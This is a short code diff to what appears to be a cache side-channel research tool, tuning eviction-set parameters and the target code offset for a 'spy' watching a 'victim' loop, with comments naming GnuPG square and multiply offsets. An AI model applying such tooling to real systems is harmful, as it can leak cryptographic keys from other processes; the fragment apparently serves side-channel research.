@@ -44,7 +44,7 @@ void init_spy(char *target_filepath, int offset_target){
     // printf("victim read\n");
 
     // prepare evset
-    Config *spy_conf= config_init(24, 2048, 64, 106, 2097152, 1, 1);
+    Config *spy_conf= config_init(16, 2048, 64, 106, 2097152, 1, 1);
     init_evset(spy_conf);
     printf("[+] spy: init evset done\n");
     spy_evsets = find_evset(spy_conf, victim);
@@ -114,7 +114,7 @@ int main(int ac, char **av){
     // int my_target = 0x15cb;
     if(ac!=3) return 0;
     // int my_target = 0xd57ed; 
-    int my_target = 0x118a;
+    int my_target = 0x1134;
     //0x116f-0x11b4 victim_loop2, loop itself 0x118a - 0x11a8, take 0x118a alder lake
     //0xd57ed madgpg sqr, 0xd571f mul
     // loop2 skylake 0x118a
